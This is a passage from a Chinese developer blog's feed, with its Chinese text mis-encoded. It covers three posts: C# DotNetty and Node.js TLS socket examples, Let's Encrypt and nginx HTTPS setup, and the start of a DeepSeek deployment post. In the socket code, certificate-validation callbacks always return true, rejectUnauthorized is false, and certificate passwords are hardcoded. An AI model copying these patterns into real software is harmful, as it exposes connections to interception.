å¤„ç†å™¨</span></span><br><span class="line">               .OnConnectionClose((server, connection) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;è¿æ¥å…³é—­,è¿æ¥å[<span class="subst">&#123;connection.ConnectionName&#125;</span>],å½“å‰è¿æ¥æ•°:<span class="subst">&#123;server.GetConnectionCount()&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnException(ex =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;æœåŠ¡ç«¯å¼‚å¸¸:<span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnNewConnection((server, connection) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    connection.ConnectionName = <span class="string">$&quot;åå­—<span class="subst">&#123;connection.ConnectionId&#125;</span>&quot;</span>;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;æ–°çš„è¿æ¥[<span class="subst">&#123;connection.ClientAddress.Address.MapToIPv4().ToString()&#125;</span>]:<span class="subst">&#123;connection.ConnectionName&#125;</span>,å½“å‰è¿æ¥æ•°:<span class="subst">&#123;server.GetConnectionCount()&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnRecieve((server, connection, bytes) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;æœåŠ¡ç«¯:æ•°æ®<span class="subst">&#123;Encoding.UTF8.GetString(bytes)&#125;</span>&quot;</span>);</span><br><span class="line">                    connection.Send(bytes);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnSend((server, connection, bytes) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å‘è¿æ¥å[<span class="subst">&#123;connection.ConnectionName&#125;</span>]å‘é€æ•°æ®:<span class="subst">&#123;Encoding.UTF8.GetString(bytes)&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnServerStarted(server =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;æœåŠ¡å¯åŠ¨&quot;</span>);</span><br><span class="line">                &#125;).BuildAsync();</span><br><span class="line"></span><br><span class="line">            Console.ReadLine();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">TcpSocketServerBuilderExtensions</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ITcpSocketServerBuilder <span class="title">SetSslHandler</span>(<span class="params"><span class="keyword">this</span> ITcpSocketServerBuilder builder, X509Certificate2 serverCertificate</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> tcpBuilder = builder <span class="keyword">as</span> TcpSocketServerBuilder;</span><br><span class="line">            tcpBuilder._setEncoder += x =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                x.AddLast(<span class="string">&quot;tls&quot;</span>, <span class="keyword">new</span> TlsHandler(stream =&gt; <span class="keyword">new</span> System.Net.Security.SslStream(stream, <span class="literal">true</span>, (sender, receivedCertificate, chain, errors) =&gt; <span class="literal">true</span>), <span class="keyword">new</span> DotNetty.Handlers.Tls.ServerTlsSettings(serverCertificate)));</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> builder;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="socket-client"><a href="#socket-client" class="headerlink" title="socket client"></a>socket client</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Coldairarrow.DotNettySocket;</span><br><span class="line"><span class="keyword">using</span> DotNetty.Handlers.Tls;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net.Security;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">TcpSocket.Client</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// åŠ è½½å®¢æˆ·ç«¯è¯ä¹¦</span></span><br><span class="line">            <span class="keyword">var</span> clientCertificate = <span class="keyword">new</span> X509Certificate2(Path.Combine(AppContext.BaseDirectory, <span class="string">&quot;your_certificate.pfx&quot;</span>), <span class="string">&quot;your_password&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> theClient = <span class="keyword">await</span> SocketBuilderFactory.GetTcpSocketClientBuilder(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6001</span>)</span><br><span class="line">               .SetLengthFieldEncoder(<span class="number">2</span>)</span><br><span class="line">               .SetLengthFieldDecoder(<span class="built_in">ushort</span>.MaxValue, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">               .SetSslHandler(clientCertificate) <span class="comment">// æ·»åŠ  SSL å¤„ç†å™¨å¹¶ä¼ å…¥å®¢æˆ·ç«¯è¯ä¹¦</span></span><br><span class="line">               .OnClientStarted(client =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å®¢æˆ·ç«¯å¯åŠ¨&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnClientClose(client =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å®¢æˆ·ç«¯å…³é—­&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnException(ex =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å¼‚å¸¸:<span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnRecieve((client, bytes) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å®¢æˆ·ç«¯:æ”¶åˆ°æ•°æ®:<span class="subst">&#123;Encoding.UTF8.GetString(bytes)&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .OnSend((client, bytes) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">$&quot;å®¢æˆ·ç«¯:å‘é€æ•°æ®:<span class="subst">&#123;Encoding.UTF8.GetString(bytes)&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;)</span><br><span class="line">               .BuildAsync();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">await</span> theClient.Send(Guid.NewGuid().ToString());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">await</span> Task.Delay(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">TcpSocketClientBuilderExtensions</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ITcpSocketClientBuilder <span class="title">SetSslHandler</span>(<span class="params"><span class="keyword">this</span> ITcpSocketClientBuilder builder, X509Certificate2 clientCertificate</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> tcpBuilder = builder <span class="keyword">as</span> TcpSocketClientBuilder;</span><br><span class="line">            tcpBuilder._setEncoder += x =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> clientTlsSettings = <span class="keyword">new</span> DotNetty.Handlers.Tls.ClientTlsSettings(<span class="string">&quot;localhost&quot;</span>, <span class="keyword">new</span>[] &#123; clientCertificate &#125;);</span><br><span class="line">                x.AddLast(<span class="string">&quot;tls&quot;</span>, <span class="keyword">new</span> TlsHandler(stream =&gt; <span class="keyword">new</span> System.Net.Security.SslStream(stream, <span class="literal">true</span>, (sender, receivedCertificate, chain, errors) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ æ›´ä¸¥æ ¼çš„è¯ä¹¦éªŒè¯é€»è¾‘</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;), clientTlsSettings));</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> builder;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„-AddLast-or-x-AddFirst-â€œtlsâ€"><a href="#æ³¨æ„-AddLast-or-x-AddFirst-â€œtlsâ€" class="headerlink" title="æ³¨æ„ AddLast or  x.AddFirst(â€œtlsâ€"></a>æ³¨æ„ AddLast or  x.AddFirst(â€œtlsâ€</h2><h1 id="nodejs-clint"><a href="#nodejs-clint" class="headerlink" title="nodejs clint"></a>nodejs clint</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> tls = <span class="built_in">require</span>(<span class="string">&#x27;tls&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœåŠ¡å™¨åœ°å€å’Œç«¯å£</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SERVER_HOST</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>; <span class="comment">// æœåŠ¡å™¨ IP åœ°å€</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SERVER_PORT</span> = <span class="number">6001</span>; <span class="comment">// æœåŠ¡å™¨ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å– .pfx è¯ä¹¦</span></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    <span class="attr">pfx</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;MyCertificate.pfx&#x27;</span>), <span class="comment">// çš„ PFX è¯ä¹¦æ–‡ä»¶</span></span><br><span class="line">    <span class="attr">passphrase</span>: <span class="string">&#x27;MyPassword123&#x27;</span>, <span class="comment">// è¯ä¹¦å¯†ç ï¼Œå’ŒæœåŠ¡ç«¯ä¸€è‡´</span></span><br><span class="line">    <span class="attr">rejectUnauthorized</span>: <span class="literal">false</span> <span class="comment">// å…è®¸è‡ªç­¾åè¯ä¹¦ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®æä¾› CA è¯ä¹¦ï¼‰</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»º TLS è¿æ¥</span></span><br><span class="line"><span class="keyword">const</span> client = tls.<span class="title function_">connect</span>(<span class="variable constant_">SERVER_PORT</span>, <span class="variable constant_">SERVER_HOST</span>, options, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;âœ… æˆåŠŸè¿æ¥åˆ°æœåŠ¡å™¨&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å‘é€æµ‹è¯•æ¶ˆæ¯</span></span><br><span class="line">    <span class="title function_">sendMessage</span>(<span class="string">&#x27;Hello from Node.js TLS Client&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æ•°æ®æ¥æ”¶</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ğŸ“© æ”¶åˆ°æœåŠ¡å™¨æ¶ˆæ¯: <span class="subst">$&#123;data.toString()&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬é”™è¯¯</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`âŒ è¿æ¥é”™è¯¯: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ğŸ”´ è¿æ¥å·²å…³é—­&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬è¿æ¥å…³é—­</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ğŸ”´ æœåŠ¡å™¨å·²æ–­å¼€è¿æ¥&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€æ¶ˆæ¯æ—¶ï¼ŒåŠ ä¸Š 2 å­—èŠ‚çš„é•¿åº¦å‰ç¼€</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendMessage</span>(<span class="params">message</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> msgBuffer = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(message, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> lengthBuffer = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>); <span class="comment">// 2 å­—èŠ‚é•¿åº¦</span></span><br><span class="line">    lengthBuffer.<span class="title function_">writeUInt16BE</span>(msgBuffer.<span class="property">length</span>, <span class="number">0</span>); <span class="comment">// å¤§ç«¯åºå†™å…¥é•¿åº¦</span></span><br><span class="line">    <span class="keyword">const</span> finalBuffer = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([lengthBuffer, msgBuffer]); <span class="comment">// æ‹¼æ¥é•¿åº¦å’Œæ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    client.<span class="title function_">write</span>(finalBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.setTimeout(5000); // è®¾ç½®è¶…æ—¶ 5 ç§’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// client.on(&#x27;timeout&#x27;, () =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     console.error(&#x27;â³ è¿æ¥è¶…æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½æœªå¯åŠ¨æˆ–ç«¯å£ä¸å¯¹&#x27;);</span></span><br><span class="line"><span class="comment">//     client.destroy();</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>END</p><!--serverç«¯é•¿åº¦        public ITcpSocketServerBuilder SetLengthFieldDecoder(int maxFrameLength --->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C-ç”Ÿæˆè¯ä¹¦&quot;&gt;&lt;a href=&quot;#C-ç”Ÿæˆè¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;C#ç”Ÿæˆè¯ä¹¦&quot;&gt;&lt;/a&gt;C#ç”Ÿæˆè¯ä¹¦&lt;/h1&gt;&lt;p&gt;åœ¨ C# ä¸­ç”Ÿæˆ .pfx è¯ä¹¦æ–‡ä»¶ï¼Œé€šå¸¸å¯ä»¥å€ŸåŠ© System.Security.Cryptography</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="c#" scheme="https://banjinmei.github.io/tags/c/"/>
    
    <category term="socket" scheme="https://banjinmei.github.io/tags/socket/"/>
    
    <category term="ssl" scheme="https://banjinmei.github.io/tags/ssl/"/>
    
  </entry>
  
  <entry>
    <title>free https ssl</title>
    <link href="https://banjinmei.github.io/2025/02/13/free-https-ssl/"/>
    <id>https://banjinmei.github.io/2025/02/13/free-https-ssl/</id>
    <published>2025-02-12T17:09:12.000Z</published>
    <updated>2025-02-12T17:10:17.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç”³è¯·è¯ä¹¦"><a href="#ç”³è¯·è¯ä¹¦" class="headerlink" title="ç”³è¯·è¯ä¹¦"></a>ç”³è¯·è¯ä¹¦</h1><p>ï¼ˆ1ï¼‰ç”³è¯·è¯ä¹¦ä¹‹å‰ï¼Œéœ€è¦å‡†å¤‡å¥½ç”¨äºç»‘å®šè¯ä¹¦çš„åŸŸåï¼ˆå‡å¦‚æ‚¨çš„åŸŸåæ˜¯ï¼šabc.dm.comï¼‰ã€‚è¿™ä¸ªåŸŸåå¿…é¡»èƒ½å¤Ÿæ­£å¸¸è®¿é—®ï¼Œä¹Ÿå°±æ˜¯è¯´é€šè¿‡æµè§ˆå™¨å¯ä»¥æ­£å¸¸è®¿é—®ï¼š<a class="link"   href="http://abc.dm.com/" >http://abc.dm.com<i class="fas fa-external-link-alt"></i></a> ã€‚</p><p>ï¼ˆ2ï¼‰æ‰“å¼€ç½‘ç«™ï¼š æ¥æ­¤åŠ å¯† - Letâ€™s Encrypt åœ¨çº¿å…è´¹ç”³è¯·SSLè¯ä¹¦   <a class="link"   href="https://letsencrypt.osfipin.com/" >https://letsencrypt.osfipin.com/<i class="fas fa-external-link-alt"></i></a></p><p>ï¼ˆ3ï¼‰ç‚¹â€œç«‹å³å¼€å§‹â€ï¼Œæ³¨å†Œç”¨æˆ·ã€‚ï¼ˆå¦‚æœå·²æ³¨å†Œç”¨æˆ·ï¼Œç›´æ¥ç‚¹â€œç™»å½•â€ï¼‰</p><p>ï¼ˆ4ï¼‰ç™»å½•ä¹‹åï¼Œé€‰æ‹©â€œç”³è¯·è¯ä¹¦â€ï¼Œä¹‹åç…§ç€ç”³è¯·è¯ä¹¦çš„æŒ‡å¼•ï¼Œä¸€æ­¥æ­¥å®Œæˆè¯ä¹¦çš„ç”³è¯·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç›´æ¥æŒ‰ç…§é»˜è®¤çš„é€‰é¡¹ç”³è¯·å°±è¡Œã€‚</p><p>ï¼ˆ5ï¼‰æäº¤ç”³è¯·æˆåŠŸä¹‹åï¼Œè¿˜è¦è¿›è¡Œä¸€æ¬¡æ‰‹å·¥éªŒè¯ã€‚éªŒè¯æ–¹å¼å»ºè®®é€‰æ‹©DNSéªŒè¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p>ï¼ˆ6ï¼‰åœ¨æ‚¨çš„åŸŸåç®¡ç†ç½‘ç«™ï¼Œæ ¹æ®ç³»ç»Ÿæç¤ºçš„DNSéªŒè¯èµ„æ–™ï¼Œæ·»åŠ ä¸€æ¡TXTåŸŸåè§£æè®°å½•ï¼Œå®Œæˆä¹‹åï¼Œç‚¹å‡»éªŒè¯ã€‚ç­‰å¾…éªŒè¯é€šè¿‡ä¹‹åè¯ä¹¦å°±ç”³è¯·åˆ°æ‰‹å•¦ã€‚</p><p>OR HTTPSéªŒè¯</p><p>åˆ·æ–°<br>ä¸‹è½½è¯ä¹¦</p><h1 id="ä¿®æ”¹nginxé…ç½®"><a href="#ä¿®æ”¹nginxé…ç½®" class="headerlink" title="ä¿®æ”¹nginxé…ç½®"></a>ä¿®æ”¹nginxé…ç½®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line"><span class="comment"># listen [::]:80;</span></span><br><span class="line"></span><br><span class="line">server_name test1.xx.xyz;</span><br><span class="line"></span><br><span class="line">root /var/www/html;</span><br><span class="line">index index.html;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       443 ssl;</span><br><span class="line">        server_name  test1.xx.xyz;</span><br><span class="line"></span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;  </span><br><span class="line"> </span><br><span class="line">        ssl_certificate      /var/www/cert/fullchain.crt;</span><br><span class="line">        ssl_certificate_key  /var/www/cert/private.pem;</span><br><span class="line"> </span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /var/www/html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><p>è®¿é—®https å¦‚æœæ­£ç¡®è®¿é—®åˆ™éƒ¨ç½²æˆåŠŸ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç”³è¯·è¯ä¹¦&quot;&gt;&lt;a href=&quot;#ç”³è¯·è¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;ç”³è¯·è¯ä¹¦&quot;&gt;&lt;/a&gt;ç”³è¯·è¯ä¹¦&lt;/h1&gt;&lt;p&gt;ï¼ˆ1ï¼‰ç”³è¯·è¯ä¹¦ä¹‹å‰ï¼Œéœ€è¦å‡†å¤‡å¥½ç”¨äºç»‘å®šè¯ä¹¦çš„åŸŸåï¼ˆå‡å¦‚æ‚¨çš„åŸŸåæ˜¯ï¼šabc.dm.comï¼‰ã€‚è¿™ä¸ªåŸŸåå¿…é¡»èƒ½å¤Ÿæ­£å¸¸è®¿é—®ï¼Œä¹Ÿå°±æ˜¯è¯´</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="nginx" scheme="https://banjinmei.github.io/tags/nginx/"/>
    
    <category term="https" scheme="https://banjinmei.github.io/tags/https/"/>
    
    <category term="ssl" scheme="https://banjinmei.github.io/tags/ssl/"/>
    
  </entry>
  
  <entry>
    <title>deepseek local deploy</title>
    <link href="https://banjinmei.github.io/2025/02/06/deepseek-local-deploy/"/>
    <id>https://banjinmei.github.io/2025/02/06/deepseek-local-deploy/</id>
    <published>2025-02-05T20:21:55.000Z</published>
    <updated>2025-02-12T17:11:09.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DeepSeek"><a href="#DeepSeek" class="headerlink" title="DeepSeek"></a>DeepSeek</h1><p><strong>DeepSeek</strong>æ˜¯æ­å·æ·±åº¦æ±‚ç´¢äººå·¥æ™ºèƒ½æŠ€æœ¯æœ‰é™å…¬å¸æ¨å‡ºçš„äººå·¥æ™ºèƒ½é¡¹ç›®ï¼Œæ¶µç›–å…¬å¸å“ç‰Œã€äººå·¥æ™ºèƒ½æ¨¡å‹åŠç›¸å…³ AI å·¥å…·ç­‰å¤šå±‚å«ä¹‰ï¼Œä»¥ä¸‹æ˜¯å…·ä½“ä»‹ç»ï¼š<br><strong>å…¬å¸å±‚é¢</strong>DeepSeek æ˜¯ä¸€å®¶ 2023 å¹´ 5 æœˆæˆç«‹çš„ä¸­å›½äººå·¥æ™ºèƒ½å…¬å¸ï¼Œç”±å¯¹å†²åŸºé‡‘å…¬å¸ High-Flyer å‡ºèµ„æˆç«‹ã€‚å…¶åˆ›å§‹äººæ¢æ–‡å³°å¸¦é¢†å›¢é˜Ÿä¸“æ³¨äºäººå·¥æ™ºèƒ½åŸºç¡€æŠ€æœ¯ç ”ç©¶ä¸å¼€å‘ï¼Œåœ¨äººå·¥æ™ºèƒ½é¢†åŸŸå°¤å…¶æ˜¯å¤§è¯­è¨€æ¨¡å‹æ–¹å‘æŠ•å…¥äº†å¤§é‡ç ”ç©¶èµ„æºå¹¶å–å¾—æˆæœã€‚<br><strong>æ¨¡å‹å±‚é¢</strong><br>DeepSeek Coderï¼š2023 å¹´ 11 æœˆ 2 æ—¥å‘å¸ƒï¼Œæ˜¯å®Œå…¨å¼€æºä¸”å¯å…è´¹ç”¨äºå•†ä¸šç”¨é€”çš„æ¨¡å‹ï¼Œä¸ºå¼€å‘è€…æä¾›äº†åŸºç¡€çš„ä»£ç ç”Ÿæˆç­‰èƒ½åŠ›æ”¯æŒã€‚<br>DeepSeek LLMï¼š2023 å¹´ 11 æœˆ 29 æ—¥æ¨å‡ºï¼Œå…·æœ‰ 670 äº¿å‚æ•°ï¼Œæ€§èƒ½ä¸å½“æ—¶çš„ GPT-4 æ¥è¿‘ï¼ŒåŒæ—¶æ¨å‡ºäº†èŠå¤©ç‰ˆæœ¬ DeepSeek Chatã€‚<br>DeepSeek V2ï¼š2024 å¹´ 5 æœˆå‘å¸ƒï¼Œä»¥æ€§ä»·æ¯”é«˜è€Œé—»åï¼Œæ¯ç™¾ä¸‡è¾“å‡º tokens ä»…éœ€ 2 å…ƒäººæ°‘å¸ï¼Œåœ¨ LLM æ’åä¸­ä½åˆ—ç¬¬ä¸ƒã€‚<br>DeepSeek R1-lite-previewï¼š2024 å¹´ 11 